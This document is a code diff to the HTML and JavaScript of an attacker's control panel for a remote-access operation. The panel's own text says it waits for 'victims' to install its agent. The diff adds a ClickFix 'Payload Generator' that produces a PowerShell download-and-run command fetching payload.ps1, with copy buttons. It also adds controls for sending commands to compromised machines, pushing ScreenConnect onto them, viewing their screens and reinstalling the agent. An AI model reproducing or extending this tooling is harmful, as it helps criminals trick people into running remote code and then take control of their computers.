@@ -53,7 +53,7 @@
         }
 
         /* ============================================================
-           SIDEBAR — Modern Glass Style
+           SIDEBAR
            ============================================================ */
 
         .sidebar {
@@ -249,27 +249,6 @@
             gap: 10px;
             flex-wrap: wrap;
         }
-        .topbar .right .btn-build {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 6px 16px;
-            background: linear-gradient(135deg, #00ff88, #00cc77);
-            border: none;
-            border-radius: 8px;
-            color: #0a0e1a;
-            font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            transition: all 0.25s ease;
-            font-family: inherit;
-        }
-        .topbar .right .btn-build:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.25);
-        }
-        .topbar .right .btn-build .icon { font-size: 16px; }
-
         .topbar .right .live-badge {
             display: flex;
             align-items: center;
@@ -351,6 +330,7 @@
         .stat-card .number.gold { color: #fbbf24; }
         .stat-card .number.red { color: #f43f5e; }
         .stat-card .number.purple { color: #8b5cf6; }
+        .stat-card .number.blue { color: #3b82f6; }
         .stat-card .sub { font-size: 10px; color: #334155; margin-top: 2px; }
 
         /* ---- FILTER BAR ---- */
@@ -415,10 +395,90 @@
         .filter-bar .btn-filter.primary { border-color: #00ff88; color: #00ff88; }
         .filter-bar .btn-filter.primary:hover { background: rgba(0, 255, 136, 0.08); }
 
+        /* ---- PAYLOAD GENERATOR ---- */
+        .payload-box {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 14px;
+            padding: 24px 28px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .payload-box .payload-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #f1f5f9;
+            margin-bottom: 6px;
+        }
+        .payload-box .payload-desc {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 20px;
+        }
+        .payload-box .payload-url {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+        .payload-box .payload-url .url-text { flex: 1; min-width: 100px; word-break: break-all; }
+        .payload-box .payload-command {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 12px;
+            color: #f1f5f9;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+        .payload-box .payload-command .cmd-text { flex: 1; min-width: 100px; word-break: break-all; }
+        .payload-box .payload-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .payload-box .payload-actions .btn {
+            padding: 6px 16px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.06);
+            background: transparent;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.25s ease;
+            font-weight: 500;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .payload-box .payload-actions .btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
+        .payload-box .payload-actions .btn.primary { border-color: #00ff88; color: #00ff88; }
+        .payload-box .payload-actions .btn.primary:hover { background: rgba(0, 255, 136, 0.08); }
+        .payload-box .payload-actions .btn.gold { border-color: #fbbf24; color: #fbbf24; }
+        .payload-box .payload-actions .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }
+
         /* ---- CLIENT GRID ---- */
         .clients-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
             gap: 14px;
             margin-top: 4px;
         }
@@ -536,6 +596,9 @@
             transition: all 0.2s ease;
             font-weight: 500;
             font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
         }
         .client-card .card-actions .btn-sm:hover {
             border-color: rgba(255,255,255,0.12);
@@ -547,10 +610,54 @@
         .client-card .card-actions .btn-sm.gold:hover { background: rgba(251, 191, 36, 0.08); }
         .client-card .card-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
         .client-card .card-actions .btn-sm.violet:hover { background: rgba(139, 92, 246, 0.08); }
+        .client-card .card-actions .btn-sm.blue { border-color: #3b82f6; color: #3b82f6; }
+        .client-card .card-actions .btn-sm.blue:hover { background: rgba(59, 130, 246, 0.08); }
         .client-card .card-actions .btn-sm.danger { border-color: #f43f5e; color: #f43f5e; }
         .client-card .card-actions .btn-sm.danger:hover { background: rgba(244, 63, 94, 0.08); }
-
         .client-card .card-actions .btn-sm .icon { font-size: 10px; }
+
+        /* ---- LOG PANEL ---- */
+        .log-panel {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .log-panel .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            font-size: 11px;
+            color: #64748b;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .log-panel .log-header .clear-log {
+            background: none;
+            border: none;
+            color: #475569;
+            cursor: pointer;
+            font-size: 11px;
+            transition: 0.2s;
+        }
+        .log-panel .log-header .clear-log:hover { color: #f43f5e; }
+        .log-panel .log-entry {
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 11px;
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+            color: #94a3b8;
+        }
+        .log-panel .log-entry .time { color: #475569; }
+        .log-panel .log-entry .type.success { color: #00ff88; }
+        .log-panel .log-entry .type.error { color: #f43f5e; }
+        .log-panel .log-entry .type.warning { color: #fbbf24; }
+        .log-panel .log-entry .type.info { color: #3b82f6; }
 
         /* ---- EMPTY STATE ---- */
         .empty-state {
@@ -691,6 +798,8 @@
         .btn.danger:hover { background: rgba(244, 63, 94, 0.08); }
         .btn.violet { border-color: #8b5cf6; color: #8b5cf6; }
         .btn.violet:hover { background: rgba(139, 92, 246, 0.08); }
+        .btn.gold { border-color: #fbbf24; color: #fbbf24; }
+        .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -729,15 +838,17 @@
             .filter-bar .filter-group input { min-width: 100%; }
             .modal-box { padding: 20px 16px; }
             .modal-box .btn-group { flex-direction: column; }
+            .payload-box { padding: 16px; }
         }
 
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr 1fr; }
             .stats-row .stat-card .number { font-size: 20px; }
-            .topbar .right .btn-build { font-size: 11px; padding: 4px 12px; }
             .topbar .right .user { font-size: 11px; }
             .client-card { padding: 14px; }
             .client-card .card-actions .btn-sm { font-size: 8px; padding: 2px 8px; }
+            .payload-box .payload-url { font-size: 11px; }
+            .payload-box .payload-command { font-size: 10px; }
         }
     </style>
 </head>
@@ -769,21 +880,20 @@
         </div>
         <div class="nav-item" data-view="offline" id="navOffline">
             <span class="icon">🔴</span>
-            Guest Connected
+            Offline Guests
             <span class="badge danger" id="sidebarOffline">0</span>
         </div>
 
         <div class="nav-divider"></div>
-        <div class="nav-section">Filters</div>
+        <div class="nav-section">Tools</div>
 
-        <div class="nav-item" data-view="recent" id="navRecent">
-            <span class="icon">🕐</span>
-            Recently Accessed
+        <div class="nav-item" data-view="payload" id="navPayload">
+            <span class="icon">📦</span>
+            Payload Generator
         </div>
-        <div class="nav-item" data-view="outdated" id="navOutdated">
-            <span class="icon">⚠️</span>
-            Outdated Clients
-            <span class="badge warning" id="sidebarOutdated">0</span>
+        <div class="nav-item" data-view="logs" id="navLogs">
+            <span class="icon">📋</span>
+            Command Logs
         </div>
 
         <div class="nav-divider"></div>
@@ -802,13 +912,10 @@
 
         <div class="topbar">
             <div class="left">
-                <h1 id="pageTitle">Access</h1>
-                <p id="pageSub">Install an agent and connect to unattended devices.</p>
+                <h1 id="pageTitle">RMM Dashboard</h1>
+                <p id="pageSub">Monitor and control remote machines.</p>
             </div>
             <div class="right">
-                <button class="btn-build" onclick="openSettings()">
-                    <span class="icon">⚡</span> Build +
-                </button>
                 <div class="live-badge">
                     <span class="dot"></span>
                     Live
@@ -836,29 +943,22 @@
                 <div class="sub">🟢 Online</div>
             </div>
             <div class="stat-card">
-                <div class="label">Guest Connected</div>
+                <div class="label">Offline Guests</div>
                 <div class="number red" id="statOffline">0</div>
                 <div class="sub">🔴 Offline</div>
             </div>
             <div class="stat-card">
-                <div class="label">Outdated</div>
-                <div class="number purple" id="statOutdated">0</div>
-                <div class="sub">⚠️ Needs update</div>
+                <div class="label">ScreenConnect</div>
+                <div class="number blue" id="statSc">0</div>
+                <div class="sub">📤 Deployed</div>
             </div>
         </div>
 
         <!-- FILTER BAR -->
         <div class="filter-bar" id="filterBar">
             <div class="filter-group">
-                <label>🔍 Name</label>
+                <label>🔍 Search</label>
                 <input type="text" id="filterName" placeholder="Search machines..." oninput="applyFilters()" />
-            </div>
-            <div class="filter-group">
-                <label>Company</label>
-                <select id="filterCompany" onchange="applyFilters()">
-                    <option value="">All</option>
-                    <option value="CipherAnon">CipherAnon</option>
-                </select>
             </div>
             <div class="filter-group">
                 <label>Device Type</label>
@@ -873,13 +973,56 @@
             <button class="btn-filter" onclick="resetFilters()">Reset</button>
         </div>
 
-        <!-- RMM CLIENTS VIEW -->
+        <!-- VIEW: RMM CLIENTS -->
         <div class="view-content active" id="viewRmm">
             <div class="clients-grid" id="clientsGrid">
                 <div class="empty-state">
                     <div class="icon">📡</div>
                     <h3>No RMM clients connected</h3>
                     <p>Waiting for victims to install the RMM agent...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW: PAYLOAD GENERATOR -->
+        <div class="view-content" id="viewPayload">
+            <div class="payload-box">
+                <div class="payload-title">📦 Payload Generator</div>
+                <div class="payload-desc">Copy the link below or the PowerShell command to deploy the RMM agent.</div>
+
+                <div style="margin-bottom:12px;">
+                    <div style="font-size:11px;color:#64748b;margin-bottom:4px;">📎 ClickFix URL</div>
+                    <div class="payload-url">
+                        <span class="url-text" id="payloadUrlDisplay">Loading...</span>
+                        <button class="btn primary" onclick="copyPayloadUrl()" style="padding:4px 12px;font-size:11px;">📋 Copy</button>
+                    </div>
+                </div>
+
+                <div style="margin-bottom:12px;">
+                    <div style="font-size:11px;color:#64748b;margin-bottom:4px;">⚡ PowerShell Command</div>
+                    <div class="payload-command">
+                        <span class="cmd-text" id="payloadCmdDisplay">Loading...</span>
+                        <button class="btn gold" onclick="copyPayloadCmd()" style="padding:4px 12px;font-size:11px;">📋 Copy</button>
+                    </div>
+                </div>
+
+                <div class="payload-actions">
+                    <button class="btn primary" onclick="copyPayloadUrl()">📋 Copy URL</button>
+                    <button class="btn gold" onclick="copyPayloadCmd()">📋 Copy Command</button>
+                    <a href="/home" target="_blank" class="btn" style="text-decoration:none;">🔗 Open ClickFix</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW: COMMAND LOGS -->
+        <div class="view-content" id="viewLogs">
+            <div class="log-panel" id="logPanel">
+                <div class="log-header">
+                    <span>📋 Command Logs</span>
+                    <button class="clear-log" onclick="clearLogs()">Clear</button>
+                </div>
+                <div id="logContainer">
+                    <div class="log-entry"><span class="time">[System]</span> <span class="type info">Logs will appear here</span></div>
                 </div>
             </div>
         </div>
@@ -893,7 +1036,7 @@
     <div class="modal-overlay" id="settingsOverlay">
         <div class="modal-box">
             <button class="close" onclick="closeSettings()">✕</button>
-            <h2>⚙️ Build Settings</h2>
+            <h2>⚙️ Settings</h2>
             <p>Configure your RMM deployment settings.</p>
 
             <div style="border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:14px;margin-bottom:14px;">
@@ -916,6 +1059,15 @@
             </div>
 
             <div>
+                <div class="form-group">
+                    <label>ScreenConnect URL</label>
+                    <input type="text" id="scUrl" placeholder="https://your-screenconnect.com/ClientSetup.msi" />
+                    <div class="help-text">The MSI URL for ScreenConnect deployment</div>
+                </div>
+                <button class="btn primary" onclick="updateScUrl()" style="width:100%;justify-content:center;">Save ScreenConnect URL</button>
+            </div>
+
+            <div style="margin-top:14px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.04);">
                 <div class="form-group">
                     <label>Telegram Bot Token</label>
                     <input type="text" id="telegramToken" placeholder="Token from @BotFather" />
@@ -975,7 +1127,8 @@
         let allClients = [];
         let filteredClients = [];
         let confirmCallback = null;
-        let currentFilter = 'all'; // all | online | offline | recent | outdated
+        let currentFilter = 'all';
+        let commandLogs = [];
 
         // ============================================================
         // HELPERS
@@ -1019,6 +1172,33 @@
             el.className = 'toast show ' + (type || '');
             clearTimeout(el._timer);
             el._timer = setTimeout(() => { el.className = 'toast'; }, 3000);
+        }
+
+        function addLog(message, type) {
+            const time = new Date().toLocaleTimeString();
+            const entry = { time, message, type: type || 'info' };
+            commandLogs.unshift(entry);
+            if (commandLogs.length > 100) commandLogs.pop();
+            renderLogs();
+        }
+
+        function renderLogs() {
+            const container = document.getElementById('logContainer');
+            if (commandLogs.length === 0) {
+                container.innerHTML = '<div class="log-entry"><span class="time">[System]</span> <span class="type info">No logs yet</span></div>';
+                return;
+            }
+            let html = '';
+            commandLogs.forEach(log => {
+                html += `<div class="log-entry"><span class="time">[${log.time}]</span> <span class="type ${log.type}">${log.message}</span></div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        function clearLogs() {
+            commandLogs = [];
+            renderLogs();
+            showToast('✅ Logs cleared', 'success');
         }
 
         // ============================================================
@@ -1085,12 +1265,10 @@
 
         function applyFilters() {
             const nameFilter = document.getElementById('filterName').value.toLowerCase().trim();
-            const companyFilter = document.getElementById('filterCompany').value;
             const deviceFilter = document.getElementById('filterDevice').value;
 
             let filtered = [...allClients];
 
-            // Name filter
             if (nameFilter) {
                 filtered = filtered.filter(c =>
                     c.pcName.toLowerCase().includes(nameFilter) ||
@@ -1099,37 +1277,18 @@
                 );
             }
 
-            // Company filter
-            if (companyFilter) {
-                filtered = filtered.filter(c => (c.company || 'CipherAnon') === companyFilter);
-            }
-
-            // Device type filter
             if (deviceFilter) {
-                const osMap = {
-                    'Windows': 'Windows',
-                    'macOS': 'macOS',
-                    'Linux': 'Linux'
-                };
+                const osMap = { 'Windows': 'Windows', 'macOS': 'macOS', 'Linux': 'Linux' };
                 filtered = filtered.filter(c => {
                     const os = c.os || 'Unknown';
                     return os.includes(osMap[deviceFilter]) || os === deviceFilter;
                 });
             }
 
-            // Status filter from sidebar
             if (currentFilter === 'online') {
                 filtered = filtered.filter(c => c.status === 'online');
             } else if (currentFilter === 'offline') {
                 filtered = filtered.filter(c => c.status === 'offline');
-            } else if (currentFilter === 'recent') {
-                filtered = filtered.slice(0, 10);
-            } else if (currentFilter === 'outdated') {
-                filtered = filtered.filter(c => {
-                    const lastSeen = new Date(c.lastSeen).getTime();
-                    const days = (Date.now() - lastSeen) / (1000 * 60 * 60 * 24);
-                    return days > 7;
-                });
             }
 
             filteredClients = filtered;
@@ -1138,7 +1297,6 @@
 
         function resetFilters() {
             document.getElementById('filterName').value = '';
-            document.getElementById('filterCompany').value = '';
             document.getElementById('filterDevice').value = '';
             currentFilter = 'all';
             document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
@@ -1158,6 +1316,7 @@
                 allClients = clients;
                 updateStats(clients);
                 applyFilters();
+                updatePayloadUrls();
             } catch (e) {
                 showToast('⚠️ Failed to fetch RMM clients', 'error');
             }
@@ -1167,20 +1326,16 @@
             const total = clients.length;
             const online = clients.filter(c => c.status === 'online').length;
             const offline = total - online;
-            const outdated = clients.filter(c => {
-                const lastSeen = new Date(c.lastSeen).getTime();
-                return (Date.now() - lastSeen) / (1000 * 60 * 60 * 24) > 7;
-            }).length;
+            const scDeployed = clients.filter(c => c.screenconnectId || c.rmmType === 'ScreenConnect').length;
 
             document.getElementById('statTotal').textContent = total;
             document.getElementById('statOnline').textContent = online;
             document.getElementById('statOffline').textContent = offline;
-            document.getElementById('statOutdated').textContent = outdated;
+            document.getElementById('statSc').textContent = scDeployed;
 
             document.getElementById('sidebarTotal').textContent = total;
             document.getElementById('sidebarOnline').textContent = online;
             document.getElementById('sidebarOffline').textContent = offline;
-            document.getElementById('sidebarOutdated').textContent = outdated;
         }
 
         function renderRmmClients(clients) {
@@ -1204,7 +1359,7 @@
                 const statusText = client.status === 'online' ? 'Online' : 'Offline';
                 const timeAgoStr = timeAgo(client.lastSeen);
                 const rmmType = client.rmmType || 'CipherAnon';
-                const hasRmm = client.rmmInstalled ? '✅' : '❌';
+                const hasSc = client.screenconnectId || client.rmmType === 'ScreenConnect';
 
                 html += `
                     <div class="client-card">
@@ -1218,10 +1373,10 @@
                             <span class="flag">${flag}</span>
                             <span class="ip">${client.ip || 'N/A'}</span>
                             <span>${client.country || 'Unknown'}</span>
-                            <span class="rmm-type">${rmmType} ${hasRmm}</span>
+                            <span class="rmm-type">${rmmType}</span>
                             <span>${client.os || 'Unknown'}</span>
                             <span class="client-id">ID: ${client.clientId}</span>
-                            ${client.screenconnectId ? `<span style="color:#00ff88;font-weight:500;">SC: ${client.screenconnectId}</span>` : ''}
+                            ${hasSc ? `<span style="color:#3b82f6;font-weight:500;">SC: ${client.screenconnectId || 'Deployed'}</span>` : ''}
                         </div>
                         <div class="card-actions">
                             <button class="btn-sm primary" onclick="sendCommand('${client.clientId}', 'whoami')">
@@ -1234,7 +1389,13 @@
                                 <span class="icon">🏓</span> Ping
                             </button>
                             <button class="btn-sm primary" onclick="deployScreenConnect('${client.clientId}')">
-                                <span class="icon">📤</span> ScreenConnect
+                                <span class="icon">📤</span> Deploy SC
+                            </button>
+                            ${hasSc ? `<button class="btn-sm blue" onclick="viewScreen('${client.clientId}')">
+                                <span class="icon">🖥️</span> View Screen
+                            </button>` : ''}
+                            <button class="btn-sm gold" onclick="reinstallAgent('${client.clientId}')">
+                                <span class="icon">🔄</span> Reinstall
                             </button>
                             <button class="btn-sm danger" onclick="uninstallAgent('${client.clientId}')">
                                 <span class="icon">🗑️</span> Uninstall
@@ -1260,21 +1421,96 @@
                 document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
                 this.classList.add('active');
 
-                if (view === 'rmm') currentFilter = 'all';
-                else if (view === 'online') currentFilter = 'online';
-                else if (view === 'offline') currentFilter = 'offline';
-                else if (view === 'recent') currentFilter = 'recent';
-                else if (view === 'outdated') currentFilter = 'outdated';
+                document.querySelectorAll('.view-content').forEach(el => el.classList.remove('active'));
 
-                applyFilters();
+                if (view === 'rmm') {
+                    document.getElementById('viewRmm').classList.add('active');
+                    document.getElementById('pageTitle').textContent = 'RMM Dashboard';
+                    document.getElementById('pageSub').textContent = 'Monitor and control remote machines.';
+                    currentFilter = 'all';
+                    applyFilters();
+                } else if (view === 'online') {
+                    document.getElementById('viewRmm').classList.add('active');
+                    document.getElementById('pageTitle').textContent = 'Host Connected';
+                    document.getElementById('pageSub').textContent = 'Online machines.';
+                    currentFilter = 'online';
+                    applyFilters();
+                } else if (view === 'offline') {
+                    document.getElementById('viewRmm').classList.add('active');
+                    document.getElementById('pageTitle').textContent = 'Offline Guests';
+                    document.getElementById('pageSub').textContent = 'Offline machines.';
+                    currentFilter = 'offline';
+                    applyFilters();
+                } else if (view === 'payload') {
+                    document.getElementById('viewPayload').classList.add('active');
+                    document.getElementById('pageTitle').textContent = 'Payload Generator';
+                    document.getElementById('pageSub').textContent = 'Generate deployment links and commands.';
+                    updatePayloadUrls();
+                } else if (view === 'logs') {
+                    document.getElementById('viewLogs').classList.add('active');
+                    document.getElementById('pageTitle').textContent = 'Command Logs';
+                    document.getElementById('pageSub').textContent = 'View all command execution history.';
+                    renderLogs();
+                }
             });
         });
 
         // ============================================================
-        // RMM ACTIONS
+        // PAYLOAD GENERATOR
+        // ============================================================
+
+        function getBaseUrl() {
+            return window.location.origin;
+        }
+
+        function updatePayloadUrls() {
+            const baseUrl = getBaseUrl();
+            document.getElementById('payloadUrlDisplay').textContent = baseUrl + '/home';
+            document.getElementById('payloadCmdDisplay').textContent = 'iex (New-Object Net.WebClient).DownloadString("' + baseUrl + '/payload.ps1")';
+        }
+
+        function copyPayloadUrl() {
+            const text = document.getElementById('payloadUrlDisplay').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('✅ URL copied!', 'success');
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.left = '-9999px';
+                ta.style.top = '-9999px';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                showToast('✅ URL copied!', 'success');
+            });
+        }
+
+        function copyPayloadCmd() {
+            const text = document.getElementById('payloadCmdDisplay').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('✅ Command copied!', 'success');
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.left = '-9999px';
+                ta.style.top = '-9999px';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                showToast('✅ Command copied!', 'success');
+            });
+        }
+
+        // ============================================================
+        // RMM ACTIONS WITH LOGGING
         // ============================================================
 
         async function sendCommand(clientId, command) {
+            addLog(`Sending command "${command}" to ${clientId}...`, 'info');
             try {
                 const res = await fetch(`/api/rmm/command/${clientId}`, {
                     method: 'POST',
@@ -1283,18 +1519,22 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
+                    addLog(`✅ Command "${command}" sent successfully`, 'success');
                     showToast(`✅ Command sent: ${command}`, 'success');
                     setTimeout(() => fetchRmmClients(), 2000);
                 } else {
+                    addLog(`❌ Failed to send "${command}": ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
             } catch (e) {
+                addLog(`❌ Error sending "${command}": ${e.message}`, 'error');
                 showToast('❌ Error sending command', 'error');
             }
         }
 
         async function deployScreenConnect(clientId) {
             if (!confirm('📤 Deploy ScreenConnect to this client?')) return;
+            addLog(`Deploying ScreenConnect to ${clientId}...`, 'info');
 
             try {
                 const res = await fetch(`/api/rmm/move/${clientId}`, {
@@ -1304,18 +1544,65 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
+                    addLog(`✅ ScreenConnect deployed to ${clientId}`, 'success');
                     showToast(`✅ ${data.message}`, 'success');
                     setTimeout(() => fetchRmmClients(), 3000);
                 } else {
+                    addLog(`❌ ScreenConnect deployment failed: ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
             } catch (e) {
+                addLog(`❌ Error deploying ScreenConnect: ${e.message}`, 'error');
                 showToast('❌ Error deploying', 'error');
+            }
+        }
+
+        function viewScreen(clientId) {
+            const client = allClients.find(c => c.clientId === clientId);
+            if (!client || !client.screenconnectId) {
+                showToast('❌ No ScreenConnect ID found for this client', 'error');
+                return;
+            }
+            // Open ScreenConnect viewer (you need to configure your SC URL)
+            const scUrl = prompt('Enter your ScreenConnect viewer URL (e.g., https://your-sc.com/Viewer/', 'https://your-screenconnect.com/Viewer/');
+            if (scUrl) {
+                window.open(scUrl + client.screenconnectId, '_blank');
+                addLog(`🖥️ Opened ScreenConnect viewer for ${client.pcName} (${client.screenconnectId})`, 'info');
+                showToast('🖥️ ScreenConnect viewer opened', 'success');
+            }
+        }
+
+        async function reinstallAgent(clientId) {
+            if (!confirm('🔄 Reinstall the RMM agent on this client?')) return;
+            addLog(`Reinstalling RMM agent on ${clientId}...`, 'info');
+
+            try {
+                // First uninstall
+                await fetch(`/api/rmm/uninstall/${clientId}`, { method: 'POST' });
+                // Then deploy again
+                const res = await fetch(`/api/rmm/command/${clientId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: 'reinstall' })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    addLog(`✅ Reinstall command sent to ${clientId}`, 'success');
+                    showToast('✅ Reinstall command sent', 'success');
+                    setTimeout(() => fetchRmmClients(), 3000);
+                } else {
+                    addLog(`❌ Reinstall failed: ${data.message}`, 'error');
+                    showToast(`❌ Failed: ${data.message}`, 'error');
+                }
+            } catch (e) {
+                addLog(`❌ Error reinstalling: ${e.message}`, 'error');
+                showToast('❌ Error reinstalling', 'error');
             }
         }
 
         async function uninstallAgent(clientId) {
             if (!confirm('⚠️ This will uninstall the RMM agent. Are you sure?')) return;
+            addLog(`Uninstalling RMM agent from ${clientId}...`, 'warning');
 
             try {
                 const res = await fetch(`/api/rmm/uninstall/${clientId}`, {
@@ -1324,12 +1611,15 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
+                    addLog(`✅ RMM agent uninstalled from ${clientId}`, 'success');
                     showToast(`✅ Uninstall command sent`, 'success');
                     setTimeout(() => fetchRmmClients(), 3000);
                 } else {
+                    addLog(`❌ Uninstall failed: ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
             } catch (e) {
+                addLog(`❌ Error uninstalling: ${e.message}`, 'error');
                 showToast('❌ Error sending uninstall command', 'error');
             }
         }
@@ -1343,6 +1633,7 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
+                    addLog(`🗑️ Client ${clientId} deleted from dashboard`, 'info');
                     showToast(`✅ Client deleted`, 'success');
                     fetchRmmClients();
                 } else {
@@ -1359,11 +1650,45 @@
 
         function openSettings() {
             document.getElementById('settingsOverlay').classList.add('active');
-            loadTelegramSettings();
+            loadSettings();
         }
 
         function closeSettings() {
             document.getElementById('settingsOverlay').classList.remove('active');
+        }
+
+        async function loadSettings() {
+            try {
+                const res = await fetch('/api/config/telegram');
+                const data = await res.json();
+                document.getElementById('telegramToken').value = data.botToken || '';
+                document.getElementById('telegramChatId').value = data.chatId || '';
+                document.getElementById('telegramNotifications').checked = data.notifications !== false;
+                document.getElementById('scUrl').value = data.screenconnectUrl || 'https://your-screenconnect.com/ClientSetup.msi';
+            } catch (e) {}
+        }
+
+        async function updateScUrl() {
+            const url = document.getElementById('scUrl').value.trim();
+            if (!url) {
+                showToast('❌ Please enter a ScreenConnect URL', 'error');
+                return;
+            }
+            try {
+                const res = await fetch('/api/config/screenconnect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ screenconnectUrl: url })
+                });
+                const data = await res.json();
+                if (data.status === 'ok') {
+                    showToast('✅ ScreenConnect URL updated!', 'success');
+                } else {
+                    showToast('❌ ' + data.message, 'error');
+                }
+            } catch (e) {
+                showToast('❌ Failed to update', 'error');
+            }
         }
 
         async function changePassword() {
@@ -1407,16 +1732,6 @@
             } catch (e) {
                 showToast('❌ Error changing password', 'error');
             }
-        }
-
-        async function loadTelegramSettings() {
-            try {
-                const res = await fetch('/api/config/telegram');
-                const data = await res.json();
-                document.getElementById('telegramToken').value = data.botToken || '';
-                document.getElementById('telegramChatId').value = data.chatId || '';
-                document.getElementById('telegramNotifications').checked = data.notifications !== false;
-            } catch (e) {}
         }
 
         async function updateTelegramSettings() {
@@ -1471,6 +1786,7 @@
             checkSession().then((valid) => {
                 if (!valid) return;
                 fetchRmmClients();
+                updatePayloadUrls();
                 setInterval(fetchRmmClients, 30000);
             });
         });
